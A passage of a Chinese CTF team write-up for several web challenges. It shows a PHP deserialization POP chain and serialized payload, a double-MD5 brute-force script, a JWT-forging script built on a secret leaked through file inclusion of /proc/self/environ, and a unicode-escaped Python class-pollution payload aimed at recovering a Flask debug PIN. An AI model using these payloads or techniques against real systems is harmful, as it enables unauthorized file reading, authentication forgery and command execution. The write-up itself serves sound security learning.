class="variable">$Wednesday</span> <span class="keyword">as</span> <span class="variable">$Thursday</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> (<span class="variable">$Thursday</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Heraclqs</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$grape</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blueberry</span>=<span class="string">&quot;sr22kaDugamdwTPhG5zU&quot;</span>;双重md加密后开头为<span class="number">123</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span> -&gt; blueberry)) == <span class="number">123</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span> -&gt; grape -&gt; hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> <span class="title class_">Sakura</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="variable">$apple</span>=<span class="keyword">new</span> <span class="title class_">Sakura</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="variable">$apple</span>-&gt;<span class="variable">$strawberry</span>=<span class="keyword">new</span> <span class="title class_">Heraclqs</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="variable">$apple</span>-&gt;<span class="variable">$strawberry</span>-&gt;<span class="variable">$grape</span>=<span class="keyword">new</span> E;</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="variable">$apple</span>-&gt;<span class="variable">$grape</span>=<span class="keyword">new</span> <span class="title function_ invoke__">E</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>))</span><br></pre></td></tr></table></figure><br>应该差不多就是这样因为我的exp没有找到只找到了之前bp上发送的payload所有上面的exp可能会的点小问题，但是大体思路就是这样。<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=&#x27;O:6:&quot;Sakura&quot;:2:&#123;s:5:&quot;apple&quot;;O:6:&quot;Sakura&quot;:2:&#123;s:5:&quot;apple&quot;;N;s:10:&quot;strawberry&quot;;O:8:&quot;Heraclqs&quot;:2:&#123;s:5:&quot;grape&quot;;O:1:&quot;E&quot;:2:&#123;s:17:&quot;DirectoryIterator&quot;;s:1:&quot;/&quot;;s:1:&quot;e&quot;;N;&#125;s:9:&quot;blueberry&quot;;s:20:&quot;sr22kaDugamdwTPhG5zU&quot;;&#125;&#125;s:10:&quot;strawberry&quot;;N;&#125;&#x27;;</span><br></pre></td></tr></table></figure><br>补充：双层md5绕过的脚本<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">CHARS = string.ascii_letters + string.digits</span><br><span class="line"></span><br><span class="line"><span class="comment"># 双层md5碰撞</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmp_double_md5</span>(<span class="params">substr, stop_event, str_len, start=<span class="number">0</span>, size=<span class="number">20</span></span>):</span><br><span class="line">    <span class="keyword">global</span> CHARS</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stop_event.is_set():</span><br><span class="line">        rnds = <span class="string">&#x27;&#x27;</span>.join(random.choice(CHARS) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(size))</span><br><span class="line">        md5_1 = hashlib.md5(rnds.encode()).hexdigest()</span><br><span class="line">        md5_2 = hashlib.md5(md5_1.encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> md5_2[start: start + str_len] == substr:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Random String:&quot;</span>, rnds)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Double MD5 Hash:&quot;</span>, md5_2)</span><br><span class="line">            stop_event.<span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    substr = sys.argv[<span class="number">1</span>].strip()</span><br><span class="line">    start_pos = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>]) <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">2</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    str_len = <span class="built_in">len</span>(substr)</span><br><span class="line">    cpus = multiprocessing.cpu_count()</span><br><span class="line">    stop_event = multiprocessing.Event()</span><br><span class="line">    processes = [multiprocessing.Process(target=cmp_double_md5, args=(substr,</span><br><span class="line">                                                                      stop_event, str_len, start_pos))</span><br><span class="line">                 <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(cpus)]</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.start()</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.join()</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>注意使用终端运行上面的代码不要把文件名写成中文。</p>
<h2 id="理想国"><a href="#理想国" class="headerlink" title="理想国"></a>理想国</h2><p>解题人：LSE<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;swagger&quot;: &quot;2.0&quot;,</span><br><span class="line">    &quot;info&quot;: &#123;</span><br><span class="line">      &quot;description&quot;: &quot;Interface API Documentation&quot;,</span><br><span class="line">      &quot;version&quot;: &quot;1.1&quot;,</span><br><span class="line">      &quot;title&quot;: &quot;Interface API&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;paths&quot;: &#123;</span><br><span class="line">      &quot;/api-base/v0/register&quot;: &#123;</span><br><span class="line">        &quot;post&quot;: &#123;</span><br><span class="line">          &quot;consumes&quot;: [</span><br><span class="line">            &quot;application/json&quot;</span><br><span class="line">          ],</span><br><span class="line">          &quot;summary&quot;: &quot;User Registration API&quot;,</span><br><span class="line">          &quot;description&quot;: &quot;Used for user registration&quot;,</span><br><span class="line">          &quot;parameters&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;username&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;in&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;required&quot;: true,</span><br><span class="line">              &quot;schema&quot;: &#123;</span><br><span class="line">                &quot;$ref&quot;: &quot;#/definitions/UserRegistration&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;password&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;in&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;required&quot;: true,</span><br><span class="line">              &quot;schema&quot;: &#123;</span><br><span class="line">                &quot;$ref&quot;: &quot;#/definitions/UserRegistration&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          ],</span><br><span class="line">          &quot;responses&quot;: &#123;</span><br><span class="line">            &quot;200&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;success&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;400&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;Invalid request parameters&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;401&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;Your wisdom is not sufficient to be called a sage&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;/api-base/v0/login&quot;: &#123;</span><br><span class="line">        &quot;post&quot;: &#123;</span><br><span class="line">          &quot;consumes&quot;: [</span><br><span class="line">            &quot;application/json&quot;</span><br><span class="line">          ],</span><br><span class="line">          &quot;summary&quot;: &quot;User Login API&quot;,</span><br><span class="line">          &quot;description&quot;: &quot;Used for user login&quot;,</span><br><span class="line">          &quot;parameters&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;username&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;in&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;required&quot;: true,</span><br><span class="line">              &quot;schema&quot;: &#123;</span><br><span class="line">                &quot;$ref&quot;: &quot;#/definitions/UserLogin&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;password&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;in&quot;: &quot;body&quot;,</span><br><span class="line">              &quot;required&quot;: true,</span><br><span class="line">              &quot;schema&quot;: &#123;</span><br><span class="line">                &quot;$ref&quot;: &quot;#/definitions/UserLogin&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          ],</span><br><span class="line">          &quot;responses&quot;: &#123;</span><br><span class="line">            &quot;200&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;success&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;400&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;Invalid request parameters&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;/api-base/v0/search&quot;: &#123;</span><br><span class="line">        &quot;get&quot;: &#123;</span><br><span class="line">          &quot;summary&quot;: &quot;Information Query API&quot;,</span><br><span class="line">          &quot;description&quot;: &quot;Used to query information&quot;,</span><br><span class="line">          &quot;parameters&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;name&quot;: &quot;file&quot;,</span><br><span class="line">              &quot;in&quot;: &quot;query&quot;,</span><br><span class="line">              &quot;required&quot;: true,</span><br><span class="line">              &quot;type&quot;: &quot;string&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          ],</span><br><span class="line">          &quot;responses&quot;: &#123;</span><br><span class="line">            &quot;200&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;success&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;400&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;Invalid request parameters&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;401&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;Unauthorized&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;404&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;File not found&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;security&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;TokenAuth&quot;: []</span><br><span class="line">            &#125;</span><br><span class="line">          ]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;/api-base/v0/logout&quot;: &#123;</span><br><span class="line">        &quot;get&quot;: &#123;</span><br><span class="line">          &quot;summary&quot;: &quot;Logout API&quot;,</span><br><span class="line">          &quot;description&quot;: &quot;Used for user logout&quot;,</span><br><span class="line">          &quot;responses&quot;: &#123;</span><br><span class="line">            &quot;200&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;success&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;401&quot;: &#123;</span><br><span class="line">              &quot;description&quot;: &quot;Unauthorized&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;security&quot;: [</span><br><span class="line">            &#123;</span><br><span class="line">              &quot;TokenAuth&quot;: []</span><br><span class="line">            &#125;</span><br><span class="line">          ]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;definitions&quot;: &#123;</span><br><span class="line">      &quot;UserRegistration&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;object&quot;,</span><br><span class="line">        &quot;properties&quot;: &#123;</span><br><span class="line">          &quot;username&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;password&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;UserLogin&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;object&quot;,</span><br><span class="line">        &quot;properties&quot;: &#123;</span><br><span class="line">          &quot;username&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;password&quot;: &#123;</span><br><span class="line">            &quot;type&quot;: &quot;string&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;securityDefinitions&quot;: &#123;</span><br><span class="line">      &quot;TokenAuth&quot;: &#123;</span><br><span class="line">        &quot;type&quot;: &quot;apiKey&quot;,</span><br><span class="line">        &quot;name&quot;: &quot;Authorization&quot;,</span><br><span class="line">        &quot;in&quot;: &quot;header&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;security&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;TokenAuth&quot;: []</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><br>点开发现端口信息全都泄露了<br>我们先利用/api-base/v0/register和/api-base/v0/login进行注册登陆。<br>在打开/api-base/v0/search进行搜索文件，我们稍微尝试一下会发现存在文件包含漏洞。<strong>啊写不下去了。一直在复现，这题我就纯口述吧</strong><br>我们通过文件包含app.py(我记得有个proc的文件是可以看到当前运行进程的，之前有找到过现在找不到了)来查看源码<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=gbk</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, send_file, render_template_string</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;TEMPLATES_RELOAD&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = os.environ.get(<span class="string">&#x27;SECRET_KEY&#x27;</span>)</span><br><span class="line">current_time = datetime.now().strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>)</span><br><span class="line"></span><br><span class="line">response0 = &#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;failed&#x27;</span>, <span class="string">&#x27;result&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">response1 = &#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;success&#x27;</span>, <span class="string">&#x27;result&#x27;</span>: current_time&#125;</span><br><span class="line">response2 = &#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Invalid request parameters&#x27;</span>, <span class="string">&#x27;result&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">auth</span>(<span class="params">func</span>):</span><br><span class="line"><span class="meta">    @wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorated</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = jwt.decode(token, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">            <span class="keyword">if</span> payload[<span class="string">&#x27;username&#x27;</span>] == User.username <span class="keyword">and</span> payload[<span class="string">&#x27;password&#x27;</span>] == User.password:</span><br><span class="line">                <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Something error?&#x27;</span>, <span class="number">500</span></span><br><span class="line">    <span class="keyword">return</span> decorated</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">func</span>):</span><br><span class="line"><span class="meta">    @wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorated</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = jwt.decode(token, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">            <span class="keyword">if</span> payload[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&quot;Plato&quot;</span> <span class="keyword">and</span> payload[<span class="string">&#x27;password&#x27;</span>] == <span class="string">&quot;ideal_state&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;You are not a sage. You cannot enter the ideal state.&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Something error?&#x27;</span>, <span class="number">500</span></span><br><span class="line">    <span class="keyword">return</span> decorated</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(<span class="string">&#x27;api-docs.json&#x27;</span>, mimetype=<span class="string">&#x27;application/json;charset=utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/enterIdealState&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@check</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getflag</span>():</span><br><span class="line">    flag = os.popen(<span class="string">&quot;/readflag&quot;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api-base/v0/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.json[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&quot;Plato&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Your wisdom is not sufficient to be called a sage.&#x27;</span>, <span class="number">401</span></span><br><span class="line">        password = request.json[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        User.setUser(username, password)</span><br><span class="line">        token = jwt.encode(&#123;<span class="string">&#x27;username&#x27;</span>: username, <span class="string">&#x27;password&#x27;</span>: password&#125;, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">        User.setToken(token)</span><br><span class="line">        <span class="keyword">return</span> jsonify(response1)</span><br><span class="line">    <span class="keyword">return</span> jsonify(response2), <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api-base/v0/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.json[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.json[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            token = User.token</span><br><span class="line">            payload = jwt.decode(token, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">            <span class="keyword">if</span> payload[<span class="string">&#x27;username&#x27;</span>] == username <span class="keyword">and</span> payload[<span class="string">&#x27;password&#x27;</span>] == password:</span><br><span class="line">                response = jsonify(response1)</span><br><span class="line">                response.set_cookie(<span class="string">&#x27;token&#x27;</span>, token)</span><br><span class="line">                <span class="keyword">return</span> response</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> jsonify(response0), <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> jwt.ExpiredSignatureError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">    <span class="keyword">return</span> jsonify(response2), <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api-base/v0/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    response = jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Logout successful!&#x27;</span>&#125;)</span><br><span class="line">    response.delete_cookie(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api-base/v0/search&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@auth</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;file&#x27;</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(request.args.get(<span class="string">&#x27;file&#x27;</span>), <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">                data = file.read()</span><br><span class="line">            <span class="keyword">return</span> render_template_string(data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;File not found&#x27;</span>, <span class="number">404</span></span><br><span class="line">        <span class="keyword">except</span> jwt.ExpiredSignatureError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;something error?&#x27;</span>, <span class="number">500</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(response2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MemUser</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setUser</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        self.username = username</span><br><span class="line">        self.password = password</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setToken</span>(<span class="params">self, token</span>):</span><br><span class="line">        self.token = token</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">        self.password = <span class="string">&quot;password&quot;</span></span><br><span class="line">        self.token = jwt.encode(&#123;<span class="string">&#x27;username&#x27;</span>: self.username, <span class="string">&#x27;password&#x27;</span>: self.password&#125;, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    User = MemUser()</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>我们审计源码会发现其存在应该函数为getflag，需要使用/enterIdealState路由才可以，当访问这个路由是会提醒，你不是Plato，而且我们也无法注册这个账号。这时候我们需要使用flask的session伪造了。我们可以看到其session的key为环境变量那么我们就可以直接使用/proc/self/environ来进行查看环境变量。在环境变量里找到key我们就可以进行伪造了。下面是脚本<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">username = <span class="string">&quot;Plato&quot;</span></span><br><span class="line">password = <span class="string">&quot;ideal_state&quot;</span></span><br><span class="line">secret_key = <span class="string">&quot;B3@uTy_L1es_IN_7he_EyEs_0f_Th3_BEh0ld3r&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&#x27;username&#x27;</span>: username, <span class="string">&#x27;password&#x27;</span>: password&#125;</span><br><span class="line">token = jwt.encode(payload, secret_key, algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Generated token:&quot;</span>, token)</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>将伪造的token放在cookie里就可以查看/enterIdealState路由得到flag了</p>
<h2 id="Po11uti0n"><a href="#Po11uti0n" class="headerlink" title="Po11uti0n~~~"></a>Po11uti0n~~~</h2><p>解题人：LSE<br>我们打开靶机可以看到很明显的交换函数。看到这个交换函数我就想起了js原型链污染。所有我查了一下python原型链污染发现好多文章。<a href="https://xz.aliyun.com/t/13072?time__1311=mqmxnDBDuDcAiQ3DsD7mN0%3Dn2DMY3YqQ4D&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F">python原型链污染</a>我们可以发现这篇文章的题目和这道题目不能说很像只能说一模一样。只是这道需要题目多过滤个<strong>file</strong>由于时间问题快到交wp的时间了所有我就写的简略些。<br>直接贴出POC<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="number">2</span><span class="punctuation">,</span><span class="attr">&quot;\u005F\u005F\u0069\u006E\u0069\u0074\u005F\u005F&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span>      <span class="attr">&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;\u005f\u005f\u0066\u0069\u006c\u0065\u005f\u005f&quot;</span><span class="punctuation">:</span>   <span class="string">&quot;/etc/machine-id&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span><span class="attr">&quot;ykg6xtt2j2l&quot;</span><span class="punctuation">:</span><span class="string">&quot;=&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><br>因为有waf所以都使用unicode编码绕过。这样我们只要修改<strong>file</strong>的参数就可以读取文件内容了。<br>而这道题目开启了debug这就导致了我们可以既然debug的后台输入pin码就可以进行命令执行<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">etc/passwd读取</span><br><span class="line">root</span><br><span class="line"></span><br><span class="line">/proc/self/cmdline 读取</span><br><span class="line">/usr/local/lib/python3.10/site-packages/flask/app.py</span><br><span class="line"></span><br><span class="line">/sys/class/net/eth0/address </span><br><span class="line">02:42:ac:02:da:ab 要转成十进制 </span><br><span 